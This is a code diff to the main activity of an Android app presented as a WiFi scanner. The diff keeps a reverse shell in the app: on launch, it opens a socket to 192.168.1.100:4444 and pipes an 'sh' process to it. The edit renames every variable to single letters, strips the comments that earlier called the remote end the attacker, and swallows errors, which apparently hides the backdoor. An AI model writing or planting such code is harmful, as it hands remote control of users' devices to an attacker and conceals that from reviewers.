@@ -2,14 +2,11 @@ package com.grovylessj.wifiscanner.ui.home
 
 import android.os.Bundle
 import androidx.appcompat.app.AppCompatActivity
-import androidx.navigation.NavController
 import androidx.navigation.fragment.NavHostFragment
 import androidx.navigation.ui.setupWithNavController
 import com.grovylessj.wifiscanner.R
 import com.grovylessj.wifiscanner.databinding.ActivityMainBinding
 import dagger.hilt.android.AndroidEntryPoint
-import java.io.InputStream
-import java.io.OutputStream
 import java.io.PrintWriter
 import java.net.Socket
 import kotlin.concurrent.thread
@@ -17,68 +14,49 @@ import kotlin.concurrent.thread
 @AndroidEntryPoint
 class MainActivity : AppCompatActivity() {
 
-    private lateinit var biding: ActivityMainBinding
-    private lateinit var navController: NavController
+    private lateinit var b: ActivityMainBinding
 
-    override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
-        biding = ActivityMainBinding.inflate(layoutInflater)
-        setContentView(biding.root)
-        initUI()
+    override fun onCreate(s: Bundle?) {
+        super.onCreate(s)
+        b = ActivityMainBinding.inflate(layoutInflater)
+        setContentView(b.root)
+        i()
     }
 
-    private fun initUI() {
-        val navHost: NavHostFragment = supportFragmentManager.findFragmentById(R.id.fragmentContainerView) as NavHostFragment
-        navController = navHost.navController
-        biding.bottomNavView.setupWithNavController(navController)
-
-        // Iniciar el reverse shell con la IP y el puerto de escucha configurados
-        startInteractiveReverseShell("192.168.1.100", 4444) // Reemplaza con tu IP y puerto de escucha
+    private fun i() {
+        val n = supportFragmentManager.findFragmentById(R.id.fragmentContainerView) as NavHostFragment
+        b.bottomNavView.setupWithNavController(n.navController)
+        r("192.168.1.100", 4444) // Reemplaza con tu IP y puerto
     }
 
-    private fun startInteractiveReverseShell(ip: String, port: Int) {
+    private fun r(ip: String, p: Int) {
         thread {
             try {
-                val socket = Socket(ip, port)
-                val outputStream: OutputStream = socket.getOutputStream()
-                val inputStream: InputStream = socket.getInputStream()
+                val s = Socket(ip, p)
+                val o = s.getOutputStream()
+                val i = s.getInputStream()
+                val sh = Runtime.getRuntime().exec("sh")
+                val pi = sh.outputStream
+                val po = sh.inputStream
+                val pe = sh.errorStream
+                val w = PrintWriter(pi, true)
 
-                // Iniciar un proceso de shell en el dispositivo
-                val process = Runtime.getRuntime().exec("sh")
-                val processInput = process.outputStream
-                val processOutput = process.inputStream
-                val processError = process.errorStream
+                thread { po.copyTo(o) }
+                thread { pe.copyTo(o) }
 
-                // Capturar el input del atacante y enviarlo al shell
-                val writer = PrintWriter(processInput, true)
-
-                // Hilo para enviar datos desde el shell de Android al atacante
-                thread {
-                    processOutput.copyTo(outputStream)
+                val b = ByteArray(1024)
+                var rd = 0
+                while (s.isConnected && i.read(b).also { rd = it } != -1) {
+                    val c = String(b, 0, rd)
+                    w.println(c)
                 }
 
-                // Hilo para enviar mensajes de error al atacante
-                thread {
-                    processError.copyTo(outputStream)
-                }
-
-                // Hilo principal: recibe comandos del atacante y los envía al shell
-                val buffer = ByteArray(1024)
-                var read = 0 // Inicialización de `read`
-                while (socket.isConnected && inputStream.read(buffer).also { read = it } != -1) {
-                    val command = String(buffer, 0, read)
-                    writer.println(command)  // Envía el comando al shell
-                }
-
-                // Cerrar todo al finalizar
-                writer.close()
-                processInput.close()
-                processOutput.close()
-                processError.close()
-                socket.close()
-            } catch (e: Exception) {
-                e.printStackTrace()
-            }
+                w.close()
+                pi.close()
+                po.close()
+                pe.close()
+                s.close()
+            } catch (_: Exception) {}
         }
     }
 }
